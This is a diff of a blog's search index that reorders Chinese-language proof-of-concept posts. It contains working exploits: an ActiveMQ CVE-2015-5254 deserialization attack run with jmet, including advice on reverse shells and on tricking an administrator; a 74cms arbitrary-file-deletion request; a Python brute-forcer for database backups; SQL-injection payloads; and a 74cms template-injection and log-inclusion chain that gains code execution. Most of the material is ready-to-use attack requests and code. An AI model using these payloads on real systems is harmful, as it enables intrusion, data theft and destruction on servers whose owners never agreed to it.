@@ -1,45 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>（CVE-2015-5254）ActiveMQ 反序列化漏洞</title>
-    <url>/2021/01/12/(CVE-2015-5254)ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="（CVE-2015-5254）ActiveMQ-反序列化漏洞"><a href="#（CVE-2015-5254）ActiveMQ-反序列化漏洞" class="headerlink" title="（CVE-2015-5254）ActiveMQ 反序列化漏洞"></a>（CVE-2015-5254）ActiveMQ 反序列化漏洞</h1><a id="more"></a>
-
-<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache ActiveMQ<br>5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java<br>Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p>
-<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache ActiveMQ 5.13.0之前的5.x版本</p>
-<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞利用过程如下：</p>
-<ol>
-<li><p> 构造（可以使用ysoserial）可执行命令的序列化对象</p>
-</li>
-<li><p> 作为一个消息，发送给目标61616端口</p>
-</li>
-<li><p> 访问web管理页面，读取消息，触发漏洞</p>
-</li>
-</ol>
-<p>使用<a href="https://github.com/ianxtianxt/jmet">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。</p>
-<p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</p>
-<p>执行：</p>
-<pre><code>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME your-ip 61616</code></pre>
-<p><img src="/images/(CVE-2015-5254)ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
-<p>此时会给目标ActiveMQ添加一个名为event的队列，我们可以通过<code>http://your-ip:8161/admin/browse.jsp?JMSDestination=event</code>看到这个队列中所有消息：</p>
-<p><img src="/images/(CVE-2015-5254)ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
-<p>点击查看这条消息即可触发命令执行，此时进入容器<code>docker-compose exec activemq bash</code>，可见/tmp/success已成功创建，说明漏洞利用成功：</p>
-<p><img src="/images/(CVE-2015-5254)ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
-<p>将命令替换成弹shell语句再利用：</p>
-<p><img src="/images/(CVE-2015-5254)ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
-<p>值得注意的是，通过web管理页面访问消息并触发漏洞这个过程需要管理员权限。在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
-<p><a href="https://vulhub.org//#/environments/activemq/CVE-2015-5254/">https://vulhub.org/\#/environments/activemq/CVE-2015-5254/</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>Poc</category>
-      </categories>
-      <tags>
-        <tag>ApacheMQ</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>74cms v4.2.1-v4.2.129-后台getshell漏洞</title>
     <url>/2021/01/12/74cms%20v4.2.1%20-%20v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="74cms-v4-2-1-v4-2-129-后台getshell漏洞"><a href="#74cms-v4-2-1-v4-2-129-后台getshell漏洞" class="headerlink" title="74cms v4.2.1-v4.2.129-后台getshell漏洞"></a>74cms v4.2.1-v4.2.129-后台getshell漏洞</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cm<a id="more"></a>s下载地址：<a href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%82">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。</a></p>
@@ -108,6 +69,45 @@ X-Requested-With: XMLHttpRequest</code></pre>
       </categories>
       <tags>
         <tag>74cms</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>（CVE-2015-5254）ActiveMQ 反序列化漏洞</title>
+    <url>/2021/01/12/(CVE-2015-5254)ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="（CVE-2015-5254）ActiveMQ-反序列化漏洞"><a href="#（CVE-2015-5254）ActiveMQ-反序列化漏洞" class="headerlink" title="（CVE-2015-5254）ActiveMQ 反序列化漏洞"></a>（CVE-2015-5254）ActiveMQ 反序列化漏洞</h1><a id="more"></a>
+
+<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache ActiveMQ<br>5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java<br>Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache ActiveMQ 5.13.0之前的5.x版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞利用过程如下：</p>
+<ol>
+<li><p> 构造（可以使用ysoserial）可执行命令的序列化对象</p>
+</li>
+<li><p> 作为一个消息，发送给目标61616端口</p>
+</li>
+<li><p> 访问web管理页面，读取消息，触发漏洞</p>
+</li>
+</ol>
+<p>使用<a href="https://github.com/ianxtianxt/jmet">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。</p>
+<p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</p>
+<p>执行：</p>
+<pre><code>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME your-ip 61616</code></pre>
+<p><img src="/images/(CVE-2015-5254)ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p>此时会给目标ActiveMQ添加一个名为event的队列，我们可以通过<code>http://your-ip:8161/admin/browse.jsp?JMSDestination=event</code>看到这个队列中所有消息：</p>
+<p><img src="/images/(CVE-2015-5254)ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+<p>点击查看这条消息即可触发命令执行，此时进入容器<code>docker-compose exec activemq bash</code>，可见/tmp/success已成功创建，说明漏洞利用成功：</p>
+<p><img src="/images/(CVE-2015-5254)ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+<p>将命令替换成弹shell语句再利用：</p>
+<p><img src="/images/(CVE-2015-5254)ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
+<p>值得注意的是，通过web管理页面访问消息并触发漏洞这个过程需要管理员权限。在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a href="https://vulhub.org//#/environments/activemq/CVE-2015-5254/">https://vulhub.org/\#/environments/activemq/CVE-2015-5254/</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Poc</category>
+      </categories>
+      <tags>
+        <tag>ApacheMQ</tag>
       </tags>
   </entry>
   <entry>
@@ -311,6 +311,27 @@ members_bind_info[type][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select us
       </tags>
   </entry>
   <entry>
+    <title>74cms v4.2.3 任意文件删除</title>
+    <url>/2021/01/12/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/</url>
+    <content><![CDATA[<h1 id="74cms-v4-2-3-任意文件删除"><a href="#74cms-v4-2-3-任意文件删除" class="headerlink" title="74cms v4.2.3 任意文件删除"></a>74cms v4.2.3 任意文件删除</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介<a id="more"></a></h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>GET /index.php?m=admin&amp;c=database&amp;a=del&amp;name=/../../../../../ HTTP/1.1
+Host: 0-sec.org
+User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/index.php?m=admin&amp;c=database&amp;a=restore
+Connection: close
+Cookie: think_template=default; PHPSESSID=6d86a34ec9125b2d08ebbb7630838682; think_language=en
+Upgrade-Insecure-Requests: 1</code></pre>
+]]></content>
+      <categories>
+        <category>Poc</category>
+      </categories>
+      <tags>
+        <tag>74cms</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>74cms v4.2.126-通杀sql注入</title>
     <url>/2021/01/12/74cms%20v4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h1 id="74cms-v4-2-126-通杀sql注入"><a href="#74cms-v4-2-126-通杀sql注入" class="headerlink" title="74cms v4.2.126-通杀sql注入"></a>74cms v4.2.126-通杀sql注入</h1><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>厂商：74cms下载地址：<a href="http://www.74cms.com/download/index.html">http://www.74cms.com/download/index.html</a></p>
@@ -355,18 +376,49 @@ http://74cms.test/index.php?m=&amp;c=jobs&amp;a=jobs_list&amp;lat=23.176465&amp;
       </tags>
   </entry>
   <entry>
-    <title>74cms v4.2.3 任意文件删除</title>
-    <url>/2021/01/12/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/</url>
-    <content><![CDATA[<h1 id="74cms-v4-2-3-任意文件删除"><a href="#74cms-v4-2-3-任意文件删除" class="headerlink" title="74cms v4.2.3 任意文件删除"></a>74cms v4.2.3 任意文件删除</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介<a id="more"></a></h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>GET /index.php?m=admin&amp;c=database&amp;a=del&amp;name=/../../../../../ HTTP/1.1
-Host: 0-sec.org
-User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en
-Accept-Encoding: gzip, deflate
-Referer: http://127.0.0.1/index.php?m=admin&amp;c=database&amp;a=restore
-Connection: close
-Cookie: think_template=default; PHPSESSID=6d86a34ec9125b2d08ebbb7630838682; think_language=en
-Upgrade-Insecure-Requests: 1</code></pre>
+    <title>74cms v4.2.3 备份文件爆破</title>
+    <url>/2021/01/12/74cms%20v4.2.3%20%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B4/</url>
+    <content><![CDATA[<h1 id="74cms-v4-2-3-备份文件爆破"><a href="#74cms-v4-2-3-备份文件爆破" class="headerlink" title="74cms v4.2.3 备份文件爆破"></a>74cms v4.2.3 备份文件爆破</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程<a id="more"></a></h2><pre><code># -*- coding: utf-8 -*-
+-------------------------------------------------
+   File Name：     74cms_MysqlBak
+   Description :
+   Author :       CoolCat
+   date：          2019/1/5
+-------------------------------------------------
+   Change Activity:
+                   2019/1/5:
+-------------------------------------------------
+&quot;&quot;&quot;
+__author__ = &#39;CoolCat&#39;
+
+import requests
+
+def getBak(time):
+    print(&quot;[running]:正在查询&quot; + time + &quot;是否存在备份&quot;)
+    dir = time + &quot;_1&quot;
+    filename = dir + &quot;_1.sql&quot;
+    url = target + &quot;//data/backup/database/&quot; + dir +&quot;/&quot;+ filename
+    session = requests.Session()
+    headers = &#123;&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,
+               &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
+               &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0&quot;,
+               &quot;Connection&quot;: &quot;close&quot;, &quot;Accept-Language&quot;: &quot;en&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;&#125;
+    cookies = &#123;&quot;think_language&quot;: &quot;en&quot;, &quot;think_template&quot;: &quot;default&quot;, &quot;PHPSESSID&quot;: &quot;6d86a34ec9125b2d08ebbb7630838682&quot;&#125;
+    response = session.get(url=url, headers=headers, cookies=cookies)
+    if response.status_code == 200:
+        print(url)
+        exit()
+
+if __name__ == &#39;__main__&#39;:
+
+    global target
+    target = &quot;http://www.target.com&quot;
+
+    for year in range(2017, 2020):
+        for mouth in range(1, 13):
+            for day in range(1, 31):
+                time = (str(year) + str(&#39;%02d&#39; % mouth) + str(&#39;%02d&#39; % day))
+                getBak(time)</code></pre>
 ]]></content>
       <categories>
         <category>Poc</category>
@@ -434,87 +486,6 @@ ajax=1&amp;reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind</code></pre>
 <p><img src="/images/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId28.png"></p>
 <p>跟踪add_focus(),发现SQL语句参数外部都可以控制，导致了注入漏洞</p>
 <p><img src="/images/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId29.png"></p>
-]]></content>
-      <categories>
-        <category>Poc</category>
-      </categories>
-      <tags>
-        <tag>74cms</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>74cms v4.2.3 备份文件爆破</title>
-    <url>/2021/01/12/74cms%20v4.2.3%20%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B4/</url>
-    <content><![CDATA[<h1 id="74cms-v4-2-3-备份文件爆破"><a href="#74cms-v4-2-3-备份文件爆破" class="headerlink" title="74cms v4.2.3 备份文件爆破"></a>74cms v4.2.3 备份文件爆破</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程<a id="more"></a></h2><pre><code># -*- coding: utf-8 -*-
--------------------------------------------------
-   File Name：     74cms_MysqlBak
-   Description :
-   Author :       CoolCat
-   date：          2019/1/5
--------------------------------------------------
-   Change Activity:
-                   2019/1/5:
--------------------------------------------------
-&quot;&quot;&quot;
-__author__ = &#39;CoolCat&#39;
-
-import requests
-
-def getBak(time):
-    print(&quot;[running]:正在查询&quot; + time + &quot;是否存在备份&quot;)
-    dir = time + &quot;_1&quot;
-    filename = dir + &quot;_1.sql&quot;
-    url = target + &quot;//data/backup/database/&quot; + dir +&quot;/&quot;+ filename
-    session = requests.Session()
-    headers = &#123;&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,
-               &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
-               &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0&quot;,
-               &quot;Connection&quot;: &quot;close&quot;, &quot;Accept-Language&quot;: &quot;en&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;&#125;
-    cookies = &#123;&quot;think_language&quot;: &quot;en&quot;, &quot;think_template&quot;: &quot;default&quot;, &quot;PHPSESSID&quot;: &quot;6d86a34ec9125b2d08ebbb7630838682&quot;&#125;
-    response = session.get(url=url, headers=headers, cookies=cookies)
-    if response.status_code == 200:
-        print(url)
-        exit()
-
-if __name__ == &#39;__main__&#39;:
-
-    global target
-    target = &quot;http://www.target.com&quot;
-
-    for year in range(2017, 2020):
-        for mouth in range(1, 13):
-            for day in range(1, 31):
-                time = (str(year) + str(&#39;%02d&#39; % mouth) + str(&#39;%02d&#39; % day))
-                getBak(time)</code></pre>
-]]></content>
-      <categories>
-        <category>Poc</category>
-      </categories>
-      <tags>
-        <tag>74cms</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>74cms v6.0.48模版注入+文件包含getshell</title>
-    <url>/2021/01/12/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/</url>
-    <content><![CDATA[<h1 id="74cms-v6-0-48模版注入-文件包含getshell"><a href="#74cms-v6-0-48模版注入-文件包含getshell" class="headerlink" title="74cms v6.0.48模版注入+文件包含getshell"></a>74cms v6.0.48模版注入+文件包含getshell</h1><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>骑士cms人才系<a id="more"></a>统，是一项基于PHP+MYSQL为核心开发的一套<strong>免费 +</strong> 开源专业人才网站系统。软件具执行效率高、模板自由切换、后台管理功能方便等诸多优秀特点。</p>
-<h2 id="0x02-漏洞概述"><a href="#0x02-漏洞概述" class="headerlink" title="0x02 漏洞概述"></a>0x02 漏洞概述</h2><p>骑士 CMS 官方发布安全更新，修复了一处远程代码执行漏洞。由于骑士 CMS 某些函数存在过滤不严格，攻击者通过构造恶意请求，配合文件包含漏洞可在无需登录的情况下执行任意代码，控制服务器。</p>
-<h2 id="0x03-影响版本"><a href="#0x03-影响版本" class="headerlink" title="0x03 影响版本"></a>0x03 影响版本</h2><p>骑士 CMS &lt; 6.0.48</p>
-<p><strong>0x04 环境搭建</strong></p>
-<p>骑士cms不支持php7.0，所以建议使用php5</p>
-<p>官网下载6.0.20版本</p>
-<p><img src="/images/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/image-20201214112017128.png" alt="image-20201214112017128"></p>
-<p>将源码放在web根目录下，访问/index.php进行安装</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1.发送如下请求：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[IP]&#x2F;index.php?m&#x3D;home&amp;a&#x3D;assign_resume_tpl</span><br><span class="line">POST:</span><br><span class="line">variable&#x3D;1&amp;tpl&#x3D;&lt;?php phpinfo(); ob_flush();?&gt;&#x2F;r&#x2F;n&lt;qscms&#x2F;company_show 列表名&#x3D;&quot;info&quot; 企业id&#x3D;&quot;$_GET[&#39;id&#39;]&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640.png" alt="img"></p>
-<p>查看日志会发现已经记录了错误<br>位置：\phpstudy_pro\WWW\data\Runtime\Logs\Home</p>
-<p><img src="/images/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640-20201214112713818.png" alt="img"></p>
-<p>3.包含日志</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[IP]&#x2F;index.php?m&#x3D;home&amp;a&#x3D;assign_resume_tpl</span><br><span class="line">POST:</span><br><span class="line">variable&#x3D;1&amp;tpl&#x3D;data&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;20_12_12.log</span><br></pre></td></tr></table></figure>
-<p>日志名称就是当天的年月日，直接包含即可</p>
-<p><img src="/images/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640-20201214112801787.png" alt="img"></p>
-<p>为什么不能使用get来请求，因为url在提交给后台处理会被进行url编码，从而造成包含不成功，因此要采取post方式发送payload</p>
 ]]></content>
       <categories>
         <category>Poc</category>
@@ -765,6 +736,35 @@ Content-Length: 4</code></pre>
       </categories>
       <tags>
         <tag>ActiveMQ</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>74cms v6.0.48模版注入+文件包含getshell</title>
+    <url>/2021/01/12/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/</url>
+    <content><![CDATA[<h1 id="74cms-v6-0-48模版注入-文件包含getshell"><a href="#74cms-v6-0-48模版注入-文件包含getshell" class="headerlink" title="74cms v6.0.48模版注入+文件包含getshell"></a>74cms v6.0.48模版注入+文件包含getshell</h1><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>骑士cms人才系<a id="more"></a>统，是一项基于PHP+MYSQL为核心开发的一套<strong>免费 +</strong> 开源专业人才网站系统。软件具执行效率高、模板自由切换、后台管理功能方便等诸多优秀特点。</p>
+<h2 id="0x02-漏洞概述"><a href="#0x02-漏洞概述" class="headerlink" title="0x02 漏洞概述"></a>0x02 漏洞概述</h2><p>骑士 CMS 官方发布安全更新，修复了一处远程代码执行漏洞。由于骑士 CMS 某些函数存在过滤不严格，攻击者通过构造恶意请求，配合文件包含漏洞可在无需登录的情况下执行任意代码，控制服务器。</p>
+<h2 id="0x03-影响版本"><a href="#0x03-影响版本" class="headerlink" title="0x03 影响版本"></a>0x03 影响版本</h2><p>骑士 CMS &lt; 6.0.48</p>
+<p><strong>0x04 环境搭建</strong></p>
+<p>骑士cms不支持php7.0，所以建议使用php5</p>
+<p>官网下载6.0.20版本</p>
+<p><img src="/images/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/image-20201214112017128.png" alt="image-20201214112017128"></p>
+<p>将源码放在web根目录下，访问/index.php进行安装</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1.发送如下请求：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[IP]&#x2F;index.php?m&#x3D;home&amp;a&#x3D;assign_resume_tpl</span><br><span class="line">POST:</span><br><span class="line">variable&#x3D;1&amp;tpl&#x3D;&lt;?php phpinfo(); ob_flush();?&gt;&#x2F;r&#x2F;n&lt;qscms&#x2F;company_show 列表名&#x3D;&quot;info&quot; 企业id&#x3D;&quot;$_GET[&#39;id&#39;]&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640.png" alt="img"></p>
+<p>查看日志会发现已经记录了错误<br>位置：\phpstudy_pro\WWW\data\Runtime\Logs\Home</p>
+<p><img src="/images/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640-20201214112713818.png" alt="img"></p>
+<p>3.包含日志</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[IP]&#x2F;index.php?m&#x3D;home&amp;a&#x3D;assign_resume_tpl</span><br><span class="line">POST:</span><br><span class="line">variable&#x3D;1&amp;tpl&#x3D;data&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;20_12_12.log</span><br></pre></td></tr></table></figure>
+<p>日志名称就是当天的年月日，直接包含即可</p>
+<p><img src="/images/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/640-20201214112801787.png" alt="img"></p>
+<p>为什么不能使用get来请求，因为url在提交给后台处理会被进行url编码，从而造成包含不成功，因此要采取post方式发送payload</p>
+]]></content>
+      <categories>
+        <category>Poc</category>
+      </categories>
+      <tags>
+        <tag>74cms</tag>
       </tags>
   </entry>
   <entry>
